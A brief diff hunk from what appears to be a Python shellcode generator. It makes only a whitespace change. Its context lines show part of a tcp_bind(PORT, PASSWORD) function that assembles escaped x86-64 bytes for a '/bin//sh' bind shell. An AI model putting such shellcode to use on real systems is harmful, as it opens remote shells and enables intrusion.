@@ -27,7 +27,7 @@ def tcp_bind( PORT,PASSWORD):
 	shellcode += r"\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54"
 	shellcode += r"\x5f\x52\x57\x54\x5e\x0f\x05"
 	return shellcode
-	 
+
 """
 Assembly Intel Source:
 
